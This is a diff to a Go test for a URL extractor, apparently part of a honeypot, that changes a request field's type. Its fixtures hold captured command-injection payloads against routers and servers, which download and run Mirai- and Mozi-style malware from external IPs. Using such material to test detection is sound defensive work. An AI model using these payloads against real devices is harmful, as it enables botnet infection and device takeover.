@@ -99,7 +99,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/ignored?aa=bb",
-				Raw:        "nothing",
+				Raw:        []byte("nothing"),
 				Body:       []byte("dsd http://www.example.org/ fd"),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -109,7 +109,7 @@ func TestURLExtractor(t *testing.T) {
 			urlsToFind:  []string{},
 			request: models.Request{
 				Uri:        "/ignored?aa=bb",
-				Raw:        "nothing",
+				Raw:        []byte("nothing"),
 				Body:       []byte("dsd http://1.1.1.1/ fd"),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -119,7 +119,7 @@ func TestURLExtractor(t *testing.T) {
 			urlsToFind:  []string{"http://115.55.237.117:51813/Mozi.m"},
 			request: models.Request{
 				Uri:        "/ignored?aa=bb",
-				Raw:        "ssadsa",
+				Raw:        []byte("ssadsa"),
 				Body:       []byte("XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://115.55.237.117:51813/Mozi.m+-O+->/tmp/gpon80"),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -129,7 +129,7 @@ func TestURLExtractor(t *testing.T) {
 			urlsToFind:  []string{"http://192.210.162.147/arm7"},
 			request: models.Request{
 				Uri:        "/ignored?aa=bb",
-				Raw:        "ssadsa application/x-www-form-urlencoded ds",
+				Raw:        []byte("ssadsa application/x-www-form-urlencoded ds"),
 				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -140,7 +140,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/ignored?aa=bb",
-				Raw:        "ssadsads",
+				Raw:        []byte("ssadsads"),
 				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://1.2.3.4/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -151,7 +151,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
-				Raw:        "ssadsads",
+				Raw:        []byte("ssadsads"),
 				Body:       []byte(""),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -162,7 +162,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F64.83.132.82%2Fmalware%2Fmirai.sh%3B%20sh%20mirai.sh",
-				Raw:        "ssadsads",
+				Raw:        []byte("ssadsads"),
 				Body:       []byte(""),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -174,7 +174,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.86.155.249/bestone/.nekoisdaddy.mips+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
-				Raw:        "ssadsads",
+				Raw:        []byte("ssadsads"),
 				Body:       []byte(""),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -185,7 +185,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/",
-				Raw:        "ssadsads Content-Type: application/x-www-form-urlencoded U",
+				Raw:        []byte("ssadsads Content-Type: application/x-www-form-urlencoded U"),
 				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://185.225.73.177/arm7;chmod+777+arm7;./arm7 rep.zyxel;rm+-rf+arm7%"),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -196,7 +196,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/?act=op&ofid=1&uid=1&vid=1&lid=1&cid=1&pid=1_\"';curl${IFS}-s${IFS}'http://193.32.162.x/jobs/tp'${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh;",
-				Raw:        "not important",
+				Raw:        []byte("not important"),
 				Body:       []byte(""),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -207,7 +207,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/shell.php?cmd=curl$IFShttp://45.61.139.121/di",
-				Raw:        "not important",
+				Raw:        []byte("not important"),
 				Body:       []byte(""),
 				HoneypotIP: "1.1.1.1",
 			},
@@ -219,7 +219,7 @@ func TestURLExtractor(t *testing.T) {
 			request: models.Request{
 
 				Uri:        "/",
-				Raw:        "",
+				Raw:        []byte(""),
 				Body:       []byte("ajax=1&username=test&realm=&enc=cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Fforti.sh%3B%20chmod%20777%20forti.sh%3B%20.%2Fforti.sh"),
 				HoneypotIP: "1.1.1.1",
 			},
